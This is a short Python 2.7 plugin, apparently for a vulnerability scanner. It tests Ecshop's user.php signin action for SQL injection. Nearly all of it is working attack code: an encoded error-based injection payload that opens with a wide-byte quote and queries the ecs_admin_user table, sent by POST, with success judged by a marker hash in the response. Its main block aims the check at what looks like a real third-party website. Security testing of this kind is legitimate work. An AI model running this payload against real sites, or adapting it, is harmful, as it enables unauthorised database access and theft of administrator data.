#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *
import re

info = {
	'NAME':'Ecshop user.php signin Action SQL Injection',
	'AUTHOR':'wjk',
	'TIME':'20150325',
	'WEB':'',
	'DESCRIPTION':'ecshop user.php signin action sqli'
}
opts = [
	['url','http://testasp.vulnweb.com','target url'],
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Ecshop':
			return True
	return False

def Audit(services):
	url = services['url'] +'/user.php?act=signin'
	post_data = {'username':'%CE%27%20and%201=1%20union%20select%201%20and%20%28select%201%20from%28select%20count%28%2a%29%2Cconcat%28%28Select%20concat%280x5b%2Cmd5%283.1415%29%2C0x5d%29%20FROM%20ecs_admin_user%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23'}
	try:
		ul = requests.post(url,data=post_data)
		if ul.status_code == 200 and '63e1f04640e83605c1d177544a5a0488' in ul.text:	
			security_hole(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
